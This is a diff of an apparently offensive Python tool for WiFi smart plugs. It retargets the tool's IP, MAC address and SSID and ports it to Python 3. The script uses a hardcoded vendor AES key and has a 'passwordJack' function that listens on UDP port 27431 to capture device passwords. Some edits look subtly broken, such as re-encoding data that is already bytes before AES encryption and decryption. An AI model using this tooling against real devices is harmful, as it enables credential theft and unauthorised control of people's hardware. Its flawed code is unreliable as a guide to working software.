@@ -16,7 +16,8 @@ import re
 import select
 import sys
 import time
-from socket import AF_INET, SOCK_DGRAM, socket
+import socket
+from socket import AF_INET, SOCK_DGRAM
 
 from Cryptodome.Cipher import AES
 
@@ -60,19 +61,19 @@ def apply_config() -> int:
     global IFACE
     IFACE = "wlan0"
     global RHOST
-    RHOST = "192.168.1.173"
+    RHOST = "192.168.145.253"
     global RMAC
-    RMAC = "00:15:61:bd:82:91"
+    RMAC = "28:d9:8a:8d:f4:bb"
     global PASSWORD
     PASSWORD = "nopassword"  # noqa: S105
     global NAME
     NAME = "lan_phone"
     global VERBOSE
-    VERBOSE = False
+    VERBOSE = True
     global SSID
-    SSID = "pina"
+    SSID = "0K_SP3"
     global WLANKEY
-    WLANKEY = "pineapplekey"
+    WLANKEY = ""
     global INITPASS
     INITPASS = "nopassword"
     global DEVNAME
@@ -81,7 +82,7 @@ def apply_config() -> int:
     # you'll likely not want to change these
     ##
     global KEY
-    KEY = "fdsl;mewrjope456fds4fbvfnjwaugfo"
+    KEY = "fdsl;mewrjope456fds4fbvfnjwaugfo".encode('utf-8')
     global RPORT
     RPORT = 27431
     global SOCKET_TIMEOUT
@@ -109,7 +110,7 @@ def create_dump(data: str) -> str:
     d, b, h = "", [], []
     u = list(data)
     for e in u:
-        h.append(e.encode("hex"))
+        h.append(e.encode("utf-8").hex())
         if e == "0x0":
             b.append("0")
         elif ord(e) < 30 or ord(e) > 128:
@@ -139,9 +140,9 @@ def crypto(switch: str, data: bytes) -> bytes:
     k = AES.new(KEY, AES.MODE_ECB)
     if data is not None:
         if switch == "e":
-            return k.encrypt(data)
+            return k.encrypt(data.encode("utf-8"))
         if switch == "d":
-            return k.decrypt(data)
+            return k.decrypt(data.encode("utf-8"))
     return b""
 
 
@@ -212,7 +213,7 @@ def get_packet(  # noqa: PLR0912
     elif t == "check timer":
         c = auth + "check#" + e + "%timer"
     elif t == "heart":
-        now = datetime.datetime.now(tz="UTC")
+        now = datetime.datetime.now()
         formatted_date = now.strftime("%y-%m-%d-%T")
         c = auth + formatted_date + d + "heart"
     elif t == "confirm":
@@ -414,7 +415,7 @@ def sendOp(op, e=None, ont=None, offt=None, y1=None, y2=None, y3=None, tid=None)
 
 def passwordJack():
     key = AES.new(KEY, AES.MODE_ECB)
-    s = socket(AF_INET, SOCK_DGRAM)
+    s = socket.socket(AF_INET, SOCK_DGRAM)
     s.bind(("", 27431))
     s.setblocking(0)
     p = re.compile("(.*?)%(.*?)%(.*?).*?")
